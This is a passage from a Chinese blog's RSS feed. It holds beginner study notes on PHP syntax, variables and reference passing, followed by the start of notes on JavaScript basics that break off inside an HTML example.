&lt;h2 id=&#34;32-php-定界符&#34;&gt;3.2 PHP 定界符&lt;/h2&gt;
&lt;p&gt;因为PHP是脚本语言，所以需要定界符。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;标准风格&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?PHP&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;i am a boy&amp;#39;&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;注意：如果整个页面都是PHP代码，PHP结束符是可以省略的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;短标记风格（默认情况下不支持，需要在php配置文件中开启支持短标记）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200511185133.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;锄禾日当午&amp;#39;&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;httpd.conf 是 apache 的配置文件&lt;/p&gt;
&lt;p&gt;php.ini 是 php 的配置文件&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;33-注释&#34;&gt;3.3 注释&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;单行注释：&lt;code&gt;//&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;多行注释：&lt;code&gt;/* */&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;
  	&lt;span style=&#34;color:#75715e&#34;&gt;// 这是单行注释
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# 这也是单行注释   
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;/*
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    	这是多行注释
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    */&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;34-php-输出语句&#34;&gt;3.4 PHP 输出语句&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;echo: 输出
print: 输出，输出成功返回1
print_r(): 输出数组
var_dump(): 输出数据，并且带有数据类型和数据长度
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?PHP&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;锄禾日当午&amp;lt;br&amp;gt;&amp;#39;&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;汗滴禾下土&amp;lt;br&amp;gt;&amp;#39;&lt;/span&gt;);
	&lt;span style=&#34;color:#a6e22e&#34;&gt;var_dump&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;abc&amp;#39;&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// string(3) &amp;#34;abc&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;4-变量&#34;&gt;4 变量&lt;/h1&gt;
&lt;p&gt;变量的本质就是内存中的一段空间。&lt;/p&gt;
&lt;h2 id=&#34;41-变量的命名规则&#34;&gt;4.1 变量的命名规则&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;变量必须以&lt;code&gt;$&lt;/code&gt;开头，&lt;code&gt;$&lt;/code&gt;符不是变量的一部分，仅表示后面的标识符是变量名。&lt;/li&gt;
&lt;li&gt;除了&lt;code&gt;$&lt;/code&gt;意以外，以字母、下划线开头，后面跟着数字、字母、下划线&lt;/li&gt;
&lt;li&gt;语句以分号结尾&lt;/li&gt;
&lt;li&gt;变量名区分大小写，&lt;code&gt;$aa&lt;/code&gt;和&lt;code&gt;$Aa&lt;/code&gt;是两个空间&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;下列变量是否合法&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;$a		合法
$a1		合法
$1a		不合法
$_1a	合法
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注意：PHP语句必须以分号结尾&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;
	$a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;;
	$name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Tom&amp;#39;&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;42-可变变量&#34;&gt;4.2 可变变量&lt;/h2&gt;
&lt;p&gt;变量名可以变，将变量名存储在另外一个变量中&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;
    $name1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;tom&amp;#39;&lt;/span&gt;;
	$name2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;berry&amp;#39;&lt;/span&gt;;
	$name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;name2&amp;#39;&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; $$name;		&lt;span style=&#34;color:#75715e&#34;&gt;// $name = &amp;#39;name1&amp;#39;时，结果为tom
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;						&lt;span style=&#34;color:#75715e&#34;&gt;// $name = &amp;#39;name2&amp;#39;时，结果为berry
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;
    $name1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;tom&amp;#39;&lt;/span&gt;;
	$name2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;berry&amp;#39;&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;rand&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) {	&lt;span style=&#34;color:#75715e&#34;&gt;// 1 奇数 0 偶数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        $name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;name1&amp;#39;&lt;/span&gt;;	&lt;span style=&#34;color:#75715e&#34;&gt;// 将变量名存储在$name中
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
        $name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;name2&amp;#39;&lt;/span&gt;;
    }
	&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; $$name;		&lt;span style=&#34;color:#75715e&#34;&gt;// tom
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;小结：&lt;/p&gt;
&lt;p&gt;rand(1, 10)：获取 1~10 的随机整数&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;43-变量传递&#34;&gt;4.3 变量传递&lt;/h2&gt;
&lt;p&gt;变量的传递有值传递和地址传递（引用传递）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;// 值传递
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    $num1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;;		&lt;span style=&#34;color:#75715e&#34;&gt;// 将10赋给$num1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	$num2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $num1;	&lt;span style=&#34;color:#75715e&#34;&gt;// 将$num1的值赋给$num2
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	$num2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;;		&lt;span style=&#34;color:#75715e&#34;&gt;// 更改$num2
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; $num1;		&lt;span style=&#34;color:#75715e&#34;&gt;// 10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200511201555.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 地址传递
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	$num1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;;		&lt;span style=&#34;color:#75715e&#34;&gt;// 将10赋给$num1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	$num2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;$num1;	&lt;span style=&#34;color:#75715e&#34;&gt;// 将$num1的地址赋给$num2
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	$num2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;;		&lt;span style=&#34;color:#75715e&#34;&gt;// 更改$num2
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; $num1;		&lt;span style=&#34;color:#75715e&#34;&gt;// 20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200511201631.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;小结：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;参数的传递有两种，值传递和地址传递&lt;/li&gt;
&lt;li&gt;&amp;amp;表示获取变量的地址&lt;/li&gt;
&lt;li&gt;值传递中，一个变量变了，另一个变量没有影响，因为是两个空间&lt;/li&gt;
&lt;li&gt;地址传递中，一个变量变了，另一个变量也变，因为是同一个空间&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;44-销毁变量&#34;&gt;4.4 销毁变量&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;用&lt;code&gt;unset()&lt;/code&gt;来销毁变量，销毁的是变量名不是变量值，变量值由php的垃圾回收机制销毁&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;
    $num1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;unset&lt;/span&gt;($num1);
	&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; $num1;

	&lt;span style=&#34;color:#75715e&#34;&gt;// 实验
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    $num1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;;
	$num2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;$num1;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;unset&lt;/span&gt;($num1);	&lt;span style=&#34;color:#75715e&#34;&gt;// 销毁的是变量名
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; $num2;		&lt;span style=&#34;color:#75715e&#34;&gt;// 10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;没有变量引用的&lt;strong&gt;值&lt;/strong&gt;是垃圾。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;5-常量&#34;&gt;5 常量&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;常量前没有&lt;code&gt;$&lt;/code&gt;符号&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;51-定义常量&#34;&gt;5.1 定义常量&lt;/h2&gt;
&lt;h2 id=&#34;52-预定义常量&#34;&gt;5.2 预定义常量&lt;/h2&gt;
&lt;h2 id=&#34;53-魔术常量&#34;&gt;5.3 魔术常量&lt;/h2&gt;
&lt;h1 id=&#34;6-数据类型&#34;&gt;6. 数据类型&lt;/h1&gt;
&lt;h2 id=&#34;61-基本类型标量类型&#34;&gt;6.1 基本类型（标量类型）&lt;/h2&gt;
&lt;h2 id=&#34;62-复合类型&#34;&gt;6.2 复合类型&lt;/h2&gt;
&lt;h2 id=&#34;63-特殊类型&#34;&gt;6.3 特殊类型&lt;/h2&gt;
&lt;h2 id=&#34;64-类型转换&#34;&gt;6.4 类型转换&lt;/h2&gt;
&lt;h1 id=&#34;7-运算符&#34;&gt;7. 运算符&lt;/h1&gt;
&lt;h1 id=&#34;8-判断&#34;&gt;8. 判断&lt;/h1&gt;
&lt;h1 id=&#34;9-循环&#34;&gt;9. 循环&lt;/h1&gt;
- https://b40du.github.io/posts/note-heima-php-basic/ - This is a customized copyright.</description>
        </item>
    
    
    
        <item>
        <title>笔记-JavaScript基础</title>
        <link>https://b40du.github.io/posts/note-heima-javascript-basic/</link>
        <pubDate>Fri, 01 May 2020 16:26:46 +0800</pubDate>
        
        <guid>https://b40du.github.io/posts/note-heima-javascript-basic/</guid>
        <description>爆肚的杂货铺 https://b40du.github.io/posts/note-heima-javascript-basic/ -&lt;h1 id=&#34;2-初识javascript&#34;&gt;2. 初识JavaScript&lt;/h1&gt;
&lt;h2 id=&#34;目标&#34;&gt;目标&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;能够说出JavaScript是什么&lt;/li&gt;
&lt;li&gt;能够知道JavaScript的发展历史&lt;/li&gt;
&lt;li&gt;能够说出浏览器执行JavaScript的原理&lt;/li&gt;
&lt;li&gt;能够说出JavaScript由哪三部分组成&lt;/li&gt;
&lt;li&gt;能够写出JavaScript三个输入输出语句&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;目录&#34;&gt;目录&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;初识JavaScript&lt;/li&gt;
&lt;li&gt;JavaScript注释&lt;/li&gt;
&lt;li&gt;JavaScript输入输出语句&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;21-初识javascript&#34;&gt;2.1 初识JavaScript&lt;/h2&gt;
&lt;h3 id=&#34;211-javascript历史&#34;&gt;2.1.1 JavaScript历史&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;布兰登·艾奇（BrendanEich，1961年~）&lt;/li&gt;
&lt;li&gt;神奇的大哥在1995年利用10天完成JavaScript涉及&lt;/li&gt;
&lt;li&gt;网景公司最初命名位LiveScript，后来在于Sun合作之后将其改名为JavaScript&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;212-javascript是什么&#34;&gt;2.1.2 JavaScript是什么&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;JavaScript是世界上最流行的语言之一，是一种运行在客户端的脚本语言（Script是脚本的意思）&lt;/li&gt;
&lt;li&gt;脚本语言：不需要编译，运行过程中由js解释器（js引擎）逐行来进行解释并执行&lt;/li&gt;
&lt;li&gt;现在也可以基于Node.js技术进行服务器端编程&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;213-javascript的作用&#34;&gt;2.1.3 JavaScript的作用&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;表单动态校验（密码强度检测）（JS产生最初的目的）&lt;/li&gt;
&lt;li&gt;网页特效&lt;/li&gt;
&lt;li&gt;服务端开发（Node.js）&lt;/li&gt;
&lt;li&gt;桌面程序（Election）&lt;/li&gt;
&lt;li&gt;App（Cordova）&lt;/li&gt;
&lt;li&gt;控制硬件-物联网（Ruff）&lt;/li&gt;
&lt;li&gt;游戏开发（cocos2d-js）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;214-htmlcssjs的关系&#34;&gt;2.1.4 HTML/CSS/JS的关系&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200503003249.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;215-浏览器执行js简介&#34;&gt;2.1.5 浏览器执行JS简介&lt;/h3&gt;
&lt;p&gt;浏览器分为两部分 渲染引擎 和 JS引擎&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;渲染引擎：用来解析HTML与CSS，俗称内核，比如chrome浏览器的blink，老版本的webkit&lt;/li&gt;
&lt;li&gt;JS引擎：也称为JS解释器。用来读取网页中的JavaScript代码，对其处理后运行，比如chrome浏览器的V8&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;浏览器本身并不会执行JS代码，而是通过内置JavaScript引擎（解释器）来执行JS代码。JS引擎执行代码时逐行解释每一句源码（转换为机器语言），然后由计算机去执行，所以JavaScript语言归为脚本语言，会逐行解释执行。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200503003729.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;216-js的组成&#34;&gt;2.1.6 JS的组成&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200503003821.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;2161-ecmascript&#34;&gt;2.1.6.1 ECMAScript&lt;/h4&gt;
&lt;p&gt;ECMAScript是由ECMA国际（原欧洲计算机制造商协会）进行标准化的一门编程语言，这种语言在万维网上应用广泛，它往往被称为JavaScript或JScript，但实际上后两者是ECMAScript语言的实现和扩展。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200503003920.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;ECMAScript：ECMAScript规定了JS的编程语言和基础核心知识，是所有浏览器厂商共同遵守的一套JS语言工业标准。&lt;/p&gt;
&lt;p&gt;更多参看MDN：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/JavaScript_technologies_overview&lt;/p&gt;
&lt;h4 id=&#34;2163-dom文档对象模型&#34;&gt;2.1.6.3 DOM——文档对象模型&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;文档对象模型&lt;/strong&gt;（Document ObjectModel，简称DOM），是W3C组织推荐的处理可扩展标记语言的&lt;strong&gt;标准编程接口&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;通过DOM提供的接口可以对页面上的各种元素进行操作（大小、位置、颜色等）。&lt;/p&gt;
&lt;h4 id=&#34;2164-bom浏览器对象模型&#34;&gt;2.1.6.4 BOM——浏览器对象模型&lt;/h4&gt;
&lt;p&gt;BOM（Browser ObjectModel，简称BOM）是指浏览器对象模型，它提供了独立于内容的、可以与浏览器窗口进行互动的对象结构。通过BOM可以操作浏览器窗口，比如弹出框、控制浏览器跳转、获取分辨率等。&lt;/p&gt;
&lt;h3 id=&#34;217-js初体验&#34;&gt;2.1.7 JS初体验&lt;/h3&gt;
&lt;p&gt;JS有3种书写位置，分别位行内、内嵌和外部。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http-equiv&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X-UA-Compatible&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ie=edge&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;Document&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;sytle&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;sytle&lt;/span&gt;&amp;gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!-- 2. 内嵌式的js --&amp;gt;&lt;/span&gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
        	&lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;沙漠骆驼&amp;#39;&lt;/span&gt;);
        &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!-- 3. 外部js script 双标签 --&amp;gt;&lt;/span&gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;my.js&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
